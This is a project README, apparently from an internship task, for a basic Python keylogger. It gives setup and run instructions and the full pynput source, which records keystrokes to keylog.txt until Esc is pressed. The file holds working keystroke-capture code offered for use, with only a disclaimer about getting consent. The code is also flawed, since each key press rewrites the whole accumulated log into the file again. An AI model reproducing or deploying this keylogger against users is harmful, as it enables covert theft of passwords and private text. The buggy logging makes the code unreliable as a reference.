# PRODIGY_TrackCode_4

# Simple Keylogger

This is a basic Python keylogger that records and logs keystrokes to a file. **Use this program ethically and ensure you have explicit permission from the user or the owner of the device before running it.**

## Installation

1. Clone the repository to your local machine.

    ```bash
    git clone https://github.com/Saicharanpadarthi/simple-keylogger.git
    cd simple-keylogger
    ```

2. Install the required library.

    ```bash
    pip install pynput
    ```

## Usage

1. Run the script.

    ```bash
    python keylogger.py
    ```

2. The keylogger will start recording keystrokes and save them to `keylog.txt` in the same directory.

3. Press the `Esc` key to stop the keylogger.

## Code Explanation

The provided script uses the `pynput` library to listen to keyboard events. Here's a brief overview of how it works:

- **Importing pynput:** The script starts by importing the necessary module from `pynput`.

    ```python
    import pynput.keyboard
    ```

- **Global Log Variable:** A global variable `log` is used to store the keystrokes.

    ```python
    log = ""
    ```

- **Processing Key Presses:** The `process_key_press` function appends the keystrokes to the log. It handles both character keys and special keys (like space and other non-character keys).

    ```python
    def process_key_press(key):
        global log
        try:
            log = log + str(key.char)
        except AttributeError:
            if key == pynput.keyboard.Key.space:
                log = log + " "
            else:
                log = log + " " + str(key) + " "
        print(log)
        with open("keylog.txt", "a") as f:
            f.write(log)
    ```

- **Stopping the Keylogger:** The `process_key_release` function stops the keylogger when the `Esc` key is pressed.

    ```python
    def process_key_release(key):
        if key == pynput.keyboard.Key.esc:
            return False
    ```

- **Listener Setup:** The script sets up the keyboard listener and starts it.

    ```python
    keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press, on_release=process_key_release)
    with keyboard_listener:
        keyboard_listener.join()
    ```

## Ethical Considerations

Keylogging can be considered illegal or unethical if done without proper consent. Always ensure you have explicit permission from the user or the owner of the device before running any keylogging software. Use this program responsibly.

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
